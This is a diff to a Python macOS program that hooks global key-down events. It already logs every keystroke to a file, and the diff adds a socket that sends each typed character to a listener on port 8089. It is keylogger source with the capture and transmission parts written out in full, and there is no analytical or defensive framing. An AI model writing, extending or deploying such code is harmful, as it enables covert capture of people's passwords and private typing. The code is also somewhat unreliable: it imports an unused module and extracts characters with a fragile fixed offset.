@@ -34,7 +34,11 @@ from AppKit import NSApplication, NSApp
 from Foundation import NSObject, NSLog
 from Cocoa import NSEvent, NSKeyDownMask
 from PyObjCTools import AppHelper
+import socket
 import sys
+import getkeys
+
+clientsocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
 class AppDelegate(NSObject):
     def applicationDidFinishLaunching_(self, notification):
@@ -43,8 +47,10 @@ class AppDelegate(NSObject):
 
 def handler(event):
     try:
+        key = event_to_key(event)
         NSLog(u"%@", event)
         eventLogged = "{}".format(event)
+        clientsocket.send(key)
         writeToFile(eventLogged)
     except KeyboardInterrupt:
         AppHelper.stopEventLoop()
@@ -53,7 +59,14 @@ def writeToFile(eventLogged):
     with open("key.log", "w", 0) as myfile:
         myfile.write(eventLogged)
 
+def event_to_key(event):
+    event = "{}".format(event)
+    keyIndex = event.index("char") + 7
+    key = event[keyIndex]
+    return key
+
 def main():
+    clientsocket.connect(('localhost', 8089))
     app = NSApplication.sharedApplication()
     delegate = AppDelegate.alloc().init()
     NSApp().setDelegate_(delegate)
